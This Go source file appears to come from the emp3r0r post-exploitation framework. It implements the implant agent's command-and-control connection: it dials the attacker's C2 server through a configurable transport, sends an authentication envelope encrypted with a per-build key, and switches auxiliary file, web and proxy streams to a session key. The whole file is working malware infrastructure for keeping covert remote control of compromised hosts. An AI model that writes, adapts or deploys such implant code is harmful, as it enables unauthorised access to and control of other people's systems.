package c2transport

import (
	"context"
	"fmt"
	"io"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/pkg/agenttransport"
)

// EstablishC2Connection connects to C2 using the configured wrapper mode.
// All auth is carried in MsgAuth CBOR over SecureConn, independent of wrapper.
//
// The returned stream is always a *transport.SecureConn. Its first frame is the
// MsgAuth envelope, encrypted with the static per-build PSK (def.AESPassword)
// so the server can authenticate and route it. Once that envelope is sent, any
// auxiliary route (FTP/WWW/proxy) stream is immediately re-keyed to the
// ephemeral PFS session key negotiated on the message tunnel — all subsequent
// frames of the session use the PFS key, never the static PSK.
func EstablishC2Connection(url, streamID, route string) (conn io.ReadWriteCloser, ctx context.Context, cancel context.CancelFunc, err error) {
	ctx, cancel = context.WithCancel(context.Background())
	mode := common.RuntimeConfig.C2ChannelMode
	if mode == "" {
		mode = def.C2ChannelModeDefault
	}
	dialer, resolveErr := agenttransport.Get(mode)
	if resolveErr != nil {
		cancel()
		return nil, nil, nil, resolveErr
	}
	logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)

	rw, err := establishChannelStream(ctx, dialer, agenttransport.Target{
		Address: url,
		Proxy:   common.RuntimeConfig.C2TransportProxy,
		Options: common.RuntimeConfig.TransportOptions,
	})
	if err != nil {
		cancel()
		return nil, nil, nil, err
	}

	if route == "" {
		_ = rw.Close()
		cancel()
		return nil, nil, nil, fmt.Errorf("missing MsgAuth route")
	}

	secureConn := transport.NewSecureConn(rw)
	if sendErr := sendMsgAuthEnvelope(secureConn, route, streamID); sendErr != nil {
		err = fmt.Errorf("send MsgAuth: %w", sendErr)
		_ = rw.Close()
		cancel()
		return nil, nil, nil, err
	}

	// The MsgAuth envelope above was encrypted with the per-build PSK. From
	// here on, auxiliary streams of an established session switch to the
	// ephemeral PFS session key. Check-in and the message tunnel are bootstrap
	// routes: they run BEFORE (and negotiate) the PFS handshake, so they must
	// stay on the PSK until the tunnel handshake completes inside MsgTunneler.
	if !isBootstrapRoute(route) {
		// Acquire a reference so a concurrent message-tunnel teardown (which
		// clears the current key for reconnect/check-in) cannot yank the key
		// out mid-setup: the relay must use the SAME key the C2 re-keys this
		// stream with, or the first data frame fails to decrypt.
		if sessionKey := acquireSessionKey(); len(sessionKey) > 0 {
			secureConn.SetKey(sessionKey)
			logging.Debugf("EstablishC2Connection: re-keyed %q stream to ephemeral PFS session key", route)
			releaseSessionKey()
		}
	}

	return secureConn, ctx, cancel, nil
}

// isBootstrapRoute reports whether the given MsgAuth route targets the
// check-in or message-tunnel route. Those two routes run the pre-handshake
// protocol and are always encrypted with the static per-build PSK.
func isBootstrapRoute(route string) bool {
	routes := &common.RuntimeConfig.C2Routes
	return route == routes.Checkin || route == routes.Msg
}

func establishChannelStream(ctx context.Context, dialer agenttransport.Dialer, target agenttransport.Target) (io.ReadWriteCloser, error) {
	type connectResult struct {
		stream io.ReadWriteCloser
		err    error
	}
	resultChan := make(chan connectResult, 1)
	go func() {
		stream, e := dialer.Dial(ctx, target)
		resultChan <- connectResult{stream: stream, err: e}
	}()

	select {
	case res := <-resultChan:
		if res.err != nil {
			return nil, fmt.Errorf("initiate channel stream: %w", res.err)
		}
		return res.stream, nil
	case <-time.After(10 * time.Second):
		return nil, fmt.Errorf("establish channel stream timeout")
	}
}
